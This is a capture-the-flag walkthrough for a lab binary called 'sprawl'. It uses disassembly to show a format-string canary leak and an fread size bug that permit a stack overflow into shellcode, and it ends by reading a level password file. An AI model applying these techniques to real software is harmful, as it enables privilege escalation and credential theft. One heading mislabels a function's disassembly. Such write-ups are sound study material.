## Level 07

Just like the previous level we start off with just an executable:

```bash
level07@rainfall:~$ ls
sprawl
level07@rainfall:~$ checksec ./sprawl
[*] '/home/level07/sprawl'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

And just like before, if we run the executable we can find two user inputs with the first having a format string exploit:

```bash
level07@rainfall:~$ ./sprawl 
  [THE SPRAWL] BostonAtlantaNewYork online.
  [SPRAWL] Packet relay node v4.2
[SPRAWL] Route tag: %x
[SPRAWL] Routing via ffffdee0
[SPRAWL] Header (hex): %x
[SPRAWL] Invalid header.
```

So lets take a look at the main function, disassemble it and try to reverse engineer the vulnerable functions:

```bash
level07@rainfall:~$ gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "set environment _=$PWD/sprawl" ./sprawl
...
(gdb) disas main
Dump of assembler code for function main:
   0x00000000004016ab <+0>:	endbr64
   0x00000000004016af <+4>:	push   %rbp
   0x00000000004016b0 <+5>:	mov    %rsp,%rbp
   0x00000000004016b3 <+8>:	sub    $0x10,%rsp
   0x00000000004016b7 <+12>:	mov    %fs:0x28,%rax
   0x00000000004016c0 <+21>:	mov    %rax,-0x8(%rbp)
   0x00000000004016c4 <+25>:	xor    %eax,%eax
   0x00000000004016c6 <+27>:	call   0x401216 <print_banner>
   0x00000000004016cb <+32>:	call   0x4012fe <route_tag>
   0x00000000004016d0 <+37>:	call   0x401457 <process_packet>
   0x00000000004016d5 <+42>:	call   0x4015e2 <dump_packets>
   0x00000000004016da <+47>:	mov    $0x0,%eax
   0x00000000004016df <+52>:	mov    -0x8(%rbp),%rdx
   0x00000000004016e3 <+56>:	sub    %fs:0x28,%rdx
   0x00000000004016ec <+65>:	je     0x4016f3 <main+72>
   0x00000000004016ee <+67>:	call   0x4010d0 <__stack_chk_fail@plt>
   0x00000000004016f3 <+72>:	leave
   0x00000000004016f4 <+73>:	ret
End of assembler dump.
```

A simple main once again, with only a couple functions being called.
`print_banner`, `route_tag`, `process_packet` and `dump_packets`.

We will not go into full detail on how we decompiled the functions, just going over the main concepts.
For example, every `printf` call we can determine the format string using the `x/s` command in `gdb`.
We won't mention this inside of this walkthrough as it would add a lot more bloat and we want to try and keep it easy to digest.
Keeping this in mind, lets continue and figure out how the binary does its work!

Since we know there are two user inputs, most likely divided over two functions we'll start with those.
Doing a bit of digging we quickly found that those are `route_tag` and `process_packet`.

So let's start with `route_tag`:

```bash
(gdb) disas route_tag
Dump of assembler code for function route_tag:
   0x00000000004012fe <+0>:	endbr64
   0x0000000000401302 <+4>:	push   %rbp
   0x0000000000401303 <+5>:	mov    %rsp,%rbp
   0x0000000000401306 <+8>:	sub    $0x90,%rsp
   0x000000000040130d <+15>:	mov    %fs:0x28,%rax
   0x0000000000401316 <+24>:	mov    %rax,-0x8(%rbp)
   0x000000000040131a <+28>:	xor    %eax,%eax
   0x000000000040131c <+30>:	lea    0xd44(%rip),%rax        # 0x402067
   0x0000000000401323 <+37>:	mov    %rax,%rdi
   0x0000000000401326 <+40>:	mov    $0x0,%eax
   0x000000000040132b <+45>:	call   0x4010e0 <printf@plt>
   0x0000000000401330 <+50>:	mov    0x2d29(%rip),%rax        # 0x404060 <stdout@GLIBC_2.2.5>
   0x0000000000401337 <+57>:	mov    %rax,%rdi
   0x000000000040133a <+60>:	call   0x401110 <fflush@plt>
   0x000000000040133f <+65>:	mov    0x2d2a(%rip),%rdx        # 0x404070 <stdin@GLIBC_2.2.5>
   0x0000000000401346 <+72>:	lea    -0x90(%rbp),%rax
   0x000000000040134d <+79>:	mov    $0x80,%esi
   0x0000000000401352 <+84>:	mov    %rax,%rdi
   0x0000000000401355 <+87>:	call   0x4010f0 <fgets@plt>
   0x000000000040135a <+92>:	test   %rax,%rax
   0x000000000040135d <+95>:	je     0x401398 <route_tag+154>
   0x000000000040135f <+97>:	lea    0xd16(%rip),%rax        # 0x40207c
   0x0000000000401366 <+104>:	mov    %rax,%rdi
   0x0000000000401369 <+107>:	mov    $0x0,%eax
   0x000000000040136e <+112>:	call   0x4010e0 <printf@plt>
   0x0000000000401373 <+117>:	lea    -0x90(%rbp),%rax
   0x000000000040137a <+124>:	mov    %rax,%rdi
   0x000000000040137d <+127>:	mov    $0x0,%eax
   0x0000000000401382 <+132>:	call   0x4010e0 <printf@plt>
   0x0000000000401387 <+137>:	mov    0x2cd2(%rip),%rax        # 0x404060 <stdout@GLIBC_2.2.5>
   0x000000000040138e <+144>:	mov    %rax,%rdi
   0x0000000000401391 <+147>:	call   0x401110 <fflush@plt>
   0x0000000000401396 <+152>:	jmp    0x401399 <route_tag+155>
   0x0000000000401398 <+154>:	nop
   0x0000000000401399 <+155>:	mov    -0x8(%rbp),%rax
   0x000000000040139d <+159>:	sub    %fs:0x28,%rax
   0x00000000004013a6 <+168>:	je     0x4013ad <route_tag+175>
   0x00000000004013a8 <+170>:	call   0x4010d0 <__stack_chk_fail@plt>
   0x00000000004013ad <+175>:	leave
   0x00000000004013ae <+176>:	ret
End of assembler dump.
```

This function is quite simple as well, just creating a buffer on the stack and using it as a parameter for `fgets` after which the same buffer gets handed to `printf` as it's formatting string.
This is our first vulnerability that allows us to print out the `stack canary`.

Next up we'll take a look at the disassembly of the `route_tag` function:

```bash
0x0000000000401457 <+0>:	endbr64
   0x000000000040145b <+4>:	push   %rbp
   0x000000000040145c <+5>:	mov    %rsp,%rbp
   0x000000000040145f <+8>:	sub    $0x70,%rsp
   0x0000000000401463 <+12>:	mov    %fs:0x28,%rax
   0x000000000040146c <+21>:	mov    %rax,-0x8(%rbp)
   0x0000000000401470 <+25>:	xor    %eax,%eax
   0x0000000000401472 <+27>:	lea    -0x5c(%rbp),%rax
   0x0000000000401476 <+31>:	mov    %rax,%rdi
   0x0000000000401479 <+34>:	call   0x4013af <read_header>
   0x000000000040147e <+39>:	test   %eax,%eax
   0x0000000000401480 <+41>:	jns    0x401496 <process_packet+63>
   0x0000000000401482 <+43>:	lea    0xc2c(%rip),%rax        # 0x4020b5
   0x0000000000401489 <+50>:	mov    %rax,%rdi
   0x000000000040148c <+53>:	call   0x4010b0 <puts@plt>
   0x0000000000401491 <+58>:	jmp    0x4015cc <process_packet+373>
   0x0000000000401496 <+63>:	movzwl -0x58(%rbp),%edx
   0x000000000040149a <+67>:	movzwl -0x56(%rbp),%eax
   0x000000000040149e <+71>:	imul   %edx,%eax
   0x00000000004014a1 <+74>:	mov    %ax,-0x6a(%rbp)
   0x00000000004014a5 <+78>:	cmpw   $0x40,-0x6a(%rbp)
   0x00000000004014aa <+83>:	jbe    0x4014c0 <process_packet+105>
   0x00000000004014ac <+85>:	lea    0xc1d(%rip),%rax        # 0x4020d0
   0x00000000004014b3 <+92>:	mov    %rax,%rdi
   0x00000000004014b6 <+95>:	call   0x4010b0 <puts@plt>
   0x00000000004014bb <+100>:	jmp    0x4015cc <process_packet+373>
   0x00000000004014c0 <+105>:	movzwl -0x58(%rbp),%eax
   0x00000000004014c4 <+109>:	movzwl %ax,%eax
   0x00000000004014c7 <+112>:	mov    %rax,-0x68(%rbp)
   0x00000000004014cb <+116>:	movzwl -0x6a(%rbp),%eax
   0x00000000004014cf <+120>:	mov    %eax,%esi
   0x00000000004014d1 <+122>:	lea    0xc28(%rip),%rax        # 0x402100
   0x00000000004014d8 <+129>:	mov    %rax,%rdi
   0x00000000004014db <+132>:	mov    $0x0,%eax
   0x00000000004014e0 <+137>:	call   0x4010e0 <printf@plt>
   0x00000000004014e5 <+142>:	mov    0x2b74(%rip),%rax        # 0x404060 <stdout@GLIBC_2.2.5>
   0x00000000004014ec <+149>:	mov    %rax,%rdi
   0x00000000004014ef <+152>:	call   0x401110 <fflush@plt>
   0x00000000004014f4 <+157>:	call   0x401100 <getchar@plt>
   0x00000000004014f9 <+162>:	mov    0x2b70(%rip),%rcx        # 0x404070 <stdin@GLIBC_2.2.5>
   0x0000000000401500 <+169>:	mov    -0x68(%rbp),%rdx
   0x0000000000401504 <+173>:	lea    -0x50(%rbp),%rax
   0x0000000000401508 <+177>:	mov    $0x1,%esi
   0x000000000040150d <+182>:	mov    %rax,%rdi
   0x0000000000401510 <+185>:	call   0x4010c0 <fread@plt>
   0x0000000000401515 <+190>:	movzwl -0x6a(%rbp),%eax
   0x0000000000401519 <+194>:	mov    $0x40,%edx
   0x000000000040151e <+199>:	cmp    %dx,%ax
   0x0000000000401521 <+202>:	cmova  %edx,%eax
   0x0000000000401524 <+205>:	movzwl %ax,%edx
   0x0000000000401527 <+208>:	lea    -0x50(%rbp),%rax
   0x000000000040152b <+212>:	mov    %rdx,%rsi
   0x000000000040152e <+215>:	mov    %rax,%rdi
   0x0000000000401531 <+218>:	call   0x40128e <calc_checksum>
   0x0000000000401536 <+223>:	mov    %eax,-0x54(%rbp)
   0x0000000000401539 <+226>:	mov    0x2e41(%rip),%eax        # 0x404380 <packet_count>
   0x000000000040153f <+232>:	cmp    $0x1f,%eax
   0x0000000000401542 <+235>:	ja     0x4015a8 <process_packet+337>
   0x0000000000401544 <+237>:	mov    0x2e36(%rip),%eax        # 0x404380 <packet_count>
   0x000000000040154a <+243>:	mov    %eax,%edx
   0x000000000040154c <+245>:	mov    %rdx,%rax
   0x000000000040154f <+248>:	add    %rax,%rax
   0x0000000000401552 <+251>:	add    %rdx,%rax
   0x0000000000401555 <+254>:	shl    $0x3,%rax
   0x0000000000401559 <+258>:	mov    %rax,%rdx
   0x000000000040155c <+261>:	lea    0x2b1d(%rip),%rax        # 0x404080 <packets>
   0x0000000000401563 <+268>:	mov    -0x5c(%rbp),%rcx
   0x0000000000401567 <+272>:	mov    %rcx,(%rdx,%rax,1)
   0x000000000040156b <+276>:	mov    -0x54(%rbp),%ecx
   0x000000000040156e <+279>:	mov    %ecx,0x8(%rdx,%rax,1)
   0x0000000000401572 <+283>:	mov    0x2e08(%rip),%eax        # 0x404380 <packet_count>
   0x0000000000401578 <+289>:	mov    %eax,%edx
   0x000000000040157a <+291>:	mov    %rdx,%rax
   0x000000000040157d <+294>:	add    %rax,%rax
   0x0000000000401580 <+297>:	add    %rdx,%rax
   0x0000000000401583 <+300>:	shl    $0x3,%rax
   0x0000000000401587 <+304>:	mov    %rax,%rdx
   0x000000000040158a <+307>:	lea    0x2aff(%rip),%rax        # 0x404090 <packets+16>
   0x0000000000401591 <+314>:	movq   $0x0,(%rdx,%rax,1)
   0x0000000000401599 <+322>:	mov    0x2de1(%rip),%eax        # 0x404380 <packet_count>
   0x000000000040159f <+328>:	add    $0x1,%eax
   0x00000000004015a2 <+331>:	mov    %eax,0x2dd8(%rip)        # 0x404380 <packet_count>
   0x00000000004015a8 <+337>:	mov    -0x54(%rbp),%eax
   0x00000000004015ab <+340>:	mov    0x2dcf(%rip),%edx        # 0x404380 <packet_count>
   0x00000000004015b1 <+346>:	lea    -0x1(%rdx),%ecx
   0x00000000004015b4 <+349>:	mov    %eax,%edx
   0x00000000004015b6 <+351>:	mov    %ecx,%esi
   0x00000000004015b8 <+353>:	lea    0xb61(%rip),%rax        # 0x402120
   0x00000000004015bf <+360>:	mov    %rax,%rdi
   0x00000000004015c2 <+363>:	mov    $0x0,%eax
   0x00000000004015c7 <+368>:	call   0x4010e0 <printf@plt>
   0x00000000004015cc <+373>:	mov    -0x8(%rbp),%rax
   0x00000000004015d0 <+377>:	sub    %fs:0x28,%rax
   0x00000000004015d9 <+386>:	je     0x4015e0 <process_packet+393>
   0x00000000004015db <+388>:	call   0x4010d0 <__stack_chk_fail@plt>
   0x00000000004015e0 <+393>:	leave
   0x00000000004015e1 <+394>:	ret
```

This function is a quite big and contains a lot of code.
We've only decompiled the necessary bits into our [source.c](./source.c) file.
`process_packet` starts off by clearing up `0x70` bytes worth of space on the stack.
Doing a bit more digging into the assembly we can conclude a couple things:
There are multiple variables, with the following offsets:
- -0x50
- -0x54
- -0x56, -0x58, -0x5c
- -0x68
- -0x6a

We can determine the size and thus most likely the datatype of the variables by looking at the amount of bytes between them.

As you can see we've also grouped 3 offsets together.
These are most likely found within a struct as there is a call to the `read_header` function with a `lea -0x5c(%rbp)` as argument.
Taking a look at the disassembly of the `read_header` function we can confirm this.

```bash
Dump of assembler code for function read_header:
   0x00000000004013af <+0>:	endbr64
   0x00000000004013b3 <+4>:	push   %rbp
   0x00000000004013b4 <+5>:	mov    %rsp,%rbp
   0x00000000004013b7 <+8>:	sub    $0x20,%rsp
   0x00000000004013bb <+12>:	mov    %rdi,-0x18(%rbp)
   0x00000000004013bf <+16>:	mov    %fs:0x28,%rax
   0x00000000004013c8 <+25>:	mov    %rax,-0x8(%rbp)
   0x00000000004013cc <+29>:	xor    %eax,%eax
   0x00000000004013ce <+31>:	lea    0xcbd(%rip),%rax        # 0x402092
   0x00000000004013d5 <+38>:	mov    %rax,%rdi
   0x00000000004013d8 <+41>:	mov    $0x0,%eax
   0x00000000004013dd <+46>:	call   0x4010e0 <printf@plt>
   0x00000000004013e2 <+51>:	mov    0x2c77(%rip),%rax        # 0x404060 <stdout@GLIBC_2.2.5>
   0x00000000004013e9 <+58>:	mov    %rax,%rdi
   0x00000000004013ec <+61>:	call   0x401110 <fflush@plt>
   0x00000000004013f1 <+66>:	mov    -0x18(%rbp),%rax
   0x00000000004013f5 <+70>:	lea    0x6(%rax),%rcx
   0x00000000004013f9 <+74>:	mov    -0x18(%rbp),%rax
   0x00000000004013fd <+78>:	lea    0x4(%rax),%rdx
   0x0000000000401401 <+82>:	mov    -0x18(%rbp),%rax
   0x0000000000401405 <+86>:	mov    %rax,%rsi
   0x0000000000401408 <+89>:	lea    0xc9b(%rip),%rax        # 0x4020aa
   0x000000000040140f <+96>:	mov    %rax,%rdi
   0x0000000000401412 <+99>:	mov    $0x0,%eax
   0x0000000000401417 <+104>:	call   0x401120 <__isoc99_scanf@plt>
   0x000000000040141c <+109>:	cmp    $0x3,%eax
   0x000000000040141f <+112>:	je     0x401428 <read_header+121>
   0x0000000000401421 <+114>:	mov    $0xffffffff,%eax
   0x0000000000401426 <+119>:	jmp    0x401441 <read_header+146>
   0x0000000000401428 <+121>:	mov    -0x18(%rbp),%rax
   0x000000000040142c <+125>:	mov    (%rax),%eax
   0x000000000040142e <+127>:	cmp    $0xdeadbeef,%eax
   0x0000000000401433 <+132>:	je     0x40143c <read_header+141>
   0x0000000000401435 <+134>:	mov    $0xffffffff,%eax
   0x000000000040143a <+139>:	jmp    0x401441 <read_header+146>
   0x000000000040143c <+141>:	mov    $0x0,%eax
   0x0000000000401441 <+146>:	mov    -0x8(%rbp),%rdx
   0x0000000000401445 <+150>:	sub    %fs:0x28,%rdx
   0x000000000040144e <+159>:	je     0x401455 <read_header+166>
   0x0000000000401450 <+161>:	call   0x4010d0 <__stack_chk_fail@plt>
   0x0000000000401455 <+166>:	leave
   0x0000000000401456 <+167>:	ret
End of assembler dump.
```

At the start of the function the passed argument (a pointer) is saved onto the stack.
Further down we can see this pointer (%rbp - 0x18) being used as a base to index on as it gets used by `scanf` as arguments:

```asm
   mov    -0x18(%rbp),%rax
   lea    0x6(%rax),%rcx
   mov    -0x18(%rbp),%rax
   lea    0x4(%rax),%rdx
   mov    -0x18(%rbp),%rax
   mov    %rax,%rsi
   lea    0xc9b(%rip),%rax        # 0x4020aa
   mov    %rax,%rdi
   mov    $0x0,%eax
   call   0x401120 <__isoc99_scanf@plt>
```

We can also determine the format string for `scanf` (just like we've been doing with `printf`) using gdb:

```bash
(gdb) x/s 0x4020aa
0x4020aa:	"%x %hx %hx"
```

The function requires 3 hexadecimal values and saves them into a struct.
Further down the first value gets compared with `0xdeadbeef`, returning an error value `-1` if it is not equal.

Great we've managed to disassemble the `read_header` function, lets get back to `process_packet`.

After the `read_header` call we can see a multiplication instruction that makes use of the values found inside the struct and then save it onto the stack at offset `-0x6a`:

```asm
   movzwl -0x58(%rbp),%edx
   movzwl -0x56(%rbp),%eax
   imul   %edx,%eax
   mov    %ax,-0x6a(%rbp)
```

The result of the multiplication used inside of the comparison `cmpw $0x40,-0x6a(%rbp)`.
Where if the result is higher than `64` a `puts` call followed by a return will take place.

Next up the size found inside the struct is saved to another stack variable.
After a `printf` and `fflush` we find a `getchar` call.
This is presumably there to clean up any newlines left from the `scanf` call.

Now we reach the main vulnerability of this function, a call to `fread`.
If we take a look at the parameters passed we quickly find the mistake.

Instead of passing the `count` and `size` from the struct we see a `1` for size and the previously saved `size` for the `nmemb` argument.

This means we can bypass the `64` byte check at the start!
If we provide `count` of `0` the multiplication will always result in a `0`, but since the `fread` does not use the result (instead the `size` we provide) we can overwrite as many bytes as we would like!

Having decompiled all of this we have enough information to craft our [`exploit`](./exploit.py).

We've upgraded the exploit script a little bit since last level.
We'll be making use of the `sendlinethen` function which as implies, sends a line and then waits till its finds the given string in the output of the process.
We're also making use of the `sendafter` function which does the opposite, it first waits till it finds the given string in the output of the process after which it will send the data.

So lets go over how the script goes to work.
First up we'll be trying to leak the `stack canary` inside of the `route_tag` function.
After a bit of trial and error we've found that the `DPA` needed for it is `23`.
So we're sending the `printf format string` `%23$p` over after we've seen the string `"[SPRAWL] Route tag: "`.

This leaks the `stack canary` which is read using `recvline` and is then converted to an integer.
Next up is our shellcode, we're creating it here since we now have the stack canary and we'll need to know the size of our payload for the upcoming prompt.

The offset of `72` bytes is done using the logic that the buffer is located on the offset `-0x50` and the `stack canary` is located on `-0x8`, giving us a total of `72` bytes before we hit it.

The address of the buffer is found using `gdb`:

```bash
level07@rainfall:~$ gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "set environment _=$PWD/sprawl" ./sprawl
...
(gdb) b *0x000000000040152b
Breakpoint 1 at 0x40152b
...
(gdb) run
...
Breakpoint 1, 0x000000000040152b in process_packet ()
(gdb) i r rax
rax            0x7fffffffe0b0      140737488347312
```

Next up we'll hit the `scanf`.
making sure the first argument we feed it is `0xdeadbeef` we can then send our payload size (in hex) after which we follow up with a count of `0`, making sure the multiplication that is being done does not exceed `64`.

Now all that is left to do is send our payload, put our script into interactive mode and retrieve our flag:

```bash
level07@rainfall:~$ python3 exploit.py 
...
$ id
uid=1008(level07) gid=1010(level07) euid=1024(flag07) groups=1010(level07),1001(levelgroup)
$ cat /home/flag07/.pass
s3cgzrg5q78t6xx73ljvm3m2zfwk02ix
```

And just like that `level 07` has been solved!
